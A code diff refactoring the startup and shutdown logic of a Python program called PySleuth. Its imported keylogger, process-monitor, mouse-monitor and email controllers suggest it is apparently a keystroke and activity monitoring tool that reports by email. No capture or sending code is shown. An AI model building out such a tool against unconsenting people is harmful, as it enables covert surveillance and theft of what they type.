@@ -1,4 +1,5 @@
-from .config import ConfigHandler, loadConfig
+from .core.data import Data
+from .config import ConfigHandler
 from .controllers import KeyLoggerController
 from .controllers import ProcessMntrController
 from .controllers import MouseMntrController
@@ -15,26 +16,39 @@ class PySleuth:
 
     def __init__(self):
         self.ctrls = Struct()
-
         self._initComponents()
 
-        self.emailCtrl = None
+        self.emailCtrl = EmailController(self)
+
+        self.connectSlots()
 
     def start(self):
-        self.emailCtrl = EmailController(self)
         self.emailCtrl.login()
+        self.RUNNING = True
 
         assert self.emailCtrl is not None
 
         try:
-            self.emailCtrl.startWorker()
+            self.emailCtrl.startWorker()  # blocking !
         except KeyboardInterrupt:
-            print("\nUser abort!")
+            pass
         except Exception as e:
             pass
         finally:
-            self.emailCtrl.logout()
+            self.onShutdown()
+
+    def onShutdown(self):
+        if self.RUNNING:
             self.RUNNING = False
+            self.emailCtrl.logout()
+
+        assert not self.RUNNING
+
+    def __del__(self):
+        self.onShutdown()
+
+    def connectSlots(self):
+        self.emailCtrl.SIG_shutdown.connect(self, "onShutdown")
 
     def _initComponents(self):
         components = ConfigHandler().getCfgRun()
